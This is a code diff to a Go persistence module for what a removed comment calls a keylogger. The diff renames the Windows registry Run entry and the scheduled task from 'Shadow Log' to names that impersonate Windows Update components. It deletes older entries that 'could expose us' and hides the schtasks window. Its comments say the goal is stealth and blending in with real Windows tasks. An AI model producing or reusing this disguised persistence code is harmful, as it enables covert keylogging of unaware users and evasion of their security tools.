@@ -10,23 +10,30 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
+// Stealth identity constants — these should look like legitimate Windows components.
+const (
+	registryValueName = "Windows Update Service"
+	taskName          = "Windows Update Telemetry"
+)
+
+// Legacy key names to clean up from previous versions.
+var legacyKeyNames = []string{
+	"Shadow Log",
+	"OneDrive Helper",
+	"OneDriveUpdate",
+	"onedrive hgelper",
+}
+
 // Install sets the currently running application to automatically start with the system.
-// This ensures the keylogger persists across reboots.
-// Currently supports Windows registry, with placeholders for macOS and Linux.
 func Install() error {
-	// Get the path to the current executable.
 	execPath, err := os.Executable()
 	if err != nil {
 		return err
 	}
 
-	// Platform-specific installation.
 	switch runtime.GOOS {
 	case "windows":
-		// Multi-layered persistence for redundancy.
 		err = installWindows(execPath)
-		// We ignore error for SchTasks as it might fail if admin is required for some flags,
-		// but we try our best.
 		installSchTasks(execPath)
 		return err
 	case "darwin":
@@ -38,18 +45,15 @@ func Install() error {
 }
 
 // IsInstalled checks if the application is configured to start automatically.
-// Returns true if the startup entry exists.
 func IsInstalled() bool {
 	switch runtime.GOOS {
 	case "windows":
 		return checkWindows()
 	}
-	// Simplified: assume not installed on unsupported platforms.
 	return false
 }
 
 // installWindows adds the executable to the Windows registry Run key.
-// This makes it start automatically on user login.
 func installWindows(execPath string) error {
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
 	if err != nil {
@@ -57,13 +61,13 @@ func installWindows(execPath string) error {
 	}
 	defer k.Close()
 
-	// 1. Cleanup old or stealthy identifiers to ensure no confusion.
-	k.DeleteValue("OneDrive Helper")
-	k.DeleteValue("OneDriveUpdate")
-	k.DeleteValue("onedrive hgelper")
+	// Clean up ALL legacy keys that could expose us.
+	for _, name := range legacyKeyNames {
+		k.DeleteValue(name)
+	}
 
-	// 2. Set the official, transparent application key.
-	return k.SetStringValue("Shadow Log", execPath)
+	// Set the new stealth key.
+	return k.SetStringValue(registryValueName, execPath)
 }
 
 // checkWindows verifies if the registry entry exists.
@@ -74,21 +78,21 @@ func checkWindows() bool {
 	}
 	defer k.Close()
 
-	_, _, err = k.GetStringValue("Shadow Log")
+	_, _, err = k.GetStringValue(registryValueName)
 	return err == nil
 }
 
 // installSchTasks creates a secondary persistence entry using Windows Task Scheduler.
 func installSchTasks(execPath string) {
-	// Disguise no longer needed; use transparent name.
-	taskName := "Shadow Log Reporting"
-	
-	// Create task that runs on Setiap logon.
-	// /sc onlog runs when user logs on.
-	// /f forces creation if already exists.
-	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", execPath, "/sc", "onlog", "/f")
+	// Use a name that blends with real Windows telemetry tasks.
+	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", execPath, "/sc", "onlogon", "/f", "/rl", "LIMITED")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd.Run()
+
+	// Clean up legacy task name if it exists.
+	cleanCmd := exec.Command("schtasks", "/delete", "/tn", "Shadow Log Reporting", "/f")
+	cleanCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cleanCmd.Run()
 }
 
 func installMacOS(_ string) error {
